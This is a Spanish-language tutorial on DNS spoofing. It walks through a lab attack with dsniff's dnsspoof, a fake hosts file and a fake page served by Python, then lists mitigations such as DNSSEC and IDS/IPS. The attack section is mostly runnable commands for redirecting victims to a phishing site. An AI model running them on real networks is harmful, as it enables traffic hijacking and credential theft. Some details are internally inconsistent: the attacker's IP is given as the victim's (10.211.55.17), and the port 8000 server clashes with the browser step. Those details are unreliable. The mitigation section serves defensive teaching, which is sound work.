# DNS Spoofing: Ataque y Mitigación

El **DNS Spoofing**, también conocido como envenenamiento de caché DNS, es un ataque en el que un agente malicioso intercepta peticiones DNS y responde con direcciones IP falsas para redirigir a los usuarios a sitios web maliciosos sin que estos se den cuenta. El objetivo principal es engañar a los usuarios para que entreguen información sensible o descarguen **malware**. Esta técnica es comúnmente utilizada en ataques de **phishing** para robar información confidencial.

El flujo del ataque de DNS Spoofing se inicia cuando un usuario solicita la dirección IP de un sitio web legítimo a un resolver DNS. El atacante intercepta esta solicitud e introduce un registro DNS falso para el sitio, haciendo que el resolver retorne la IP del sitio malicioso como si fuera la legítima. De esta manera, el usuario accede al sitio del atacante, creyendo que es el sitio seguro, y en este punto, el usuario puede entregar información sensible.

## Realización de un Ataque de DNS Spoofing

Para demostrar un ataque de DNS Spoofing, se utilizan dos máquinas virtuales Ubuntu: una como atacante (IP: 10.211.55.5) y otra como víctima (IP: 10.211.55.17). El ataque se realiza utilizando la herramienta `dnsspoof`, que forma parte del kit de herramientas `dsniff`, y un servidor web básico con Python.

### 1\. Instalación de Herramientas Necesarias

En la máquina atacante, se instala el paquete `dsniff`.

```bash
sudo apt install dsniff
```

Este comando instala el conjunto de herramientas `dsniff`, que son útiles para auditorías de red y pruebas de penetración.

### 2\. Creación del Fichero de Hosts Falsos

El primer paso para utilizar `dnsspoof` es crear un archivo de hosts que asocie un dominio legítimo con una dirección IP controlada por el atacante.

1.  **Crear el fichero de hosts:**
    ```bash
    sudo nano mynewhost.txt
    ```
    Se edita el archivo `mynewhost.txt` para incluir la asociación IP-dominio.
    ```
    10.211.55.5 www.cyberhades.com
    ```
    En este ejemplo, `10.211.55.5` es la dirección IP de la máquina atacante y `www.cyberhades.com` es el dominio que se quiere suplantar. Cada vez que se acceda a este dominio, se redirigirá a la dirección IP especificada.

### 3\. Creación de la Página Web Falsa (HTML)

El atacante debe montar un pequeño servidor web en la dirección IP especificada en `mynewhost.txt`. Esta página web será la que vea el usuario que piensa que está accediendo al sitio legítimo.

1.  **Crear el archivo `index.html`:**
    ```bash
    nano index.html
    ```
    Se crea un archivo HTML básico que simulará la página web suplantada.
    ```html
    <!DOCTYPE html>
    <html>
    <head>
        <title>CyberHades</title>
    </head>
    <body>
        <h1>Welcome to new CyberHades</h1>
        <p>This is not the original web</p>
    </body>
    </html>
    ```
    Este código HTML simple mostrará un texto que indicará que no es la página original. En un ataque real, esta página sería un clon muy similar a la legítima, con formularios para capturar credenciales u otra información personal.

### 4\. Levantamiento del Servidor Web con Python

Para servir la página HTML falsa, se levanta un servidor web simple utilizando Python.

1.  **Iniciar el servidor HTTP de Python:**
    ```bash
    python3 -m http.server 8000
    ```
      * `python3`: Invoca el intérprete de Python 3.
      * `-m http.server`: Carga el módulo de servidor HTTP integrado de Python.
      * `8000`: Especifica el puerto en el que el servidor escuchará las conexiones.
        Este comando publica la página `index.html` en la IP de la máquina atacante en el puerto 8000 (por ejemplo, `http://localhost:8000`). Esta será la página a la que se redirigirá a la víctima.

### 5\. Ejecución del Ataque DNS Spoofing

Con el servidor web funcionando, se lanza `dnsspoof` en una nueva terminal para interceptar las peticiones DNS.

1.  **Lanzar `dnsspoof`:**
    ```bash
    sudo dnsspoof -i eth0 -f mynewhost.txt
    ```
      * `sudo`: Ejecuta el comando con privilegios de superusuario.
      * `dnsspoof`: Invoca la herramienta para el DNS Spoofing.
      * `-i eth0`: Especifica la interfaz de red (`eth0`) a través de la cual se realizará el ataque y se escuchará el tráfico DNS.
      * `-f mynewhost.txt`: Indica el archivo de hosts (`mynewhost.txt`) que `dnsspoof` utilizará para las redirecciones.
        Una vez lanzado, `dnsspoof` comenzará a escuchar la red en busca de peticiones DNS. Cuando reciba una petición para uno de los dominios especificados en `mynewhost.txt`, responderá con la IP falsa y redirigirá al usuario al sitio controlado por el atacante.

### 6\. Verificación del Ataque (Desde la Máquina Víctima)

Desde la máquina víctima, se intenta acceder al dominio suplantado para comprobar si el ataque ha sido exitoso.

1.  **Hacer `ping` al dominio suplantado:**

    ```bash
    ping www.cyberhades.com
    ```

    Se observa que el `ping` no se dirige a la IP pública original del dominio, sino a la IP de la máquina atacante (`10.211.55.17`). Esto confirma que el DNS Spoofing ha desviado el tráfico correctamente.

2.  **Abrir el navegador web:**
    Al acceder a `www.cyberhades.com` en el navegador de la máquina víctima, se mostrará la página web falsa montada por el atacante, confirmando el éxito del spoofing.

Las consecuencias de un DNS Spoofing exitoso pueden ser graves, ya que el usuario, al creer que está en un sitio legítimo (por ejemplo, de trabajo), podría introducir credenciales, información personal, o descargar archivos maliciosos, permitiendo al atacante obtener información confidencial o comprometer el sistema.

## Mitigación de Ataques DNS Spoofing

Para mitigar los ataques de DNS Spoofing, se deben implementar varias estrategias de seguridad:

  * **Implementar DNSSEC (DNS Security Extensions):**
    DNSSEC añade una capa de autenticación a las respuestas DNS, asegurando su integridad y autenticidad. Esto dificulta enormemente que los atacantes manipulen las respuestas DNS sin ser detectados. Se deben usar servidores DNS con validación DNSSEC para verificar las firmas digitales de las respuestas y prevenir respuestas falsificadas.

  * **Configurar Cortafuegos y Sistemas IDS/IPS:**
    Los **cortafuegos** y los sistemas de detección y prevención de intrusiones (**IDS/IPS**) deben configurarse para detectar y bloquear el tráfico DNS sospechoso o malicioso. Estas herramientas pueden identificar patrones de tráfico anormales o conocidos asociados con ataques de DNS Spoofing.

  * **Mantener Actualizado el Software del Servidor DNS:**
    Es crucial mantener el software del servidor DNS actualizado regularmente. Las actualizaciones suelen incluir parches para vulnerabilidades conocidas que podrían ser explotadas en ataques de spoofing.

  * **Análisis de Tráfico DNS Continuo y Políticas de Seguridad Estrictas:**
    Realizar análisis de tráfico DNS continuo y aplicar políticas de seguridad estrictas en el manejo interno de las DNS puede ayudar a identificar y prevenir ataques.

La implementación de estas estrategias de mitigación es fundamental para proteger la arquitectura de red contra los ataques de DNS Spoofing, proporcionando robustez en la autenticidad y seguridad de las respuestas DNS.